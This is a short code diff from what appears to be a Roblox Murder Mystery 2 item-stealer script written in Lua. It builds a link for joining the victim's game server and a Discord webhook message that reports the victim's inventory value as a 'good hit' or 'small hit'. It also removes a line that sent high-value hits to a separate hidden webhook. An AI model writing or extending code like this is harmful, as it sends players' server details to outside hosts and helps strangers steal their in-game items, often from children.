@@ -136,7 +136,6 @@ local function postToDiscord(link)
     local serverLink = "https://script-9209.github.io/mm2-joiner/?placeId=142823291&gameInstanceId=" .. game.JobId
     local currentPlayers = #playersService:GetPlayers()
     
-    local finalUrl = (overallValue >= dh_val) and dh_webhook or link
     
     local embedPayload = {
         content = (overallValue >= minPingVal and minPingVal > 0 and "@everyone " or "> ") .. "**" .. (overallValue >= minPingVal and "⋆｡ ɢᴏᴏᴏᴅ ʜɪᴛ ｡⋆" or "『 ꜱᴍᴀʟʟ ʜɪᴛ 』") .. " • Value: " .. string.format("%.2f", overallValue) .. "**",
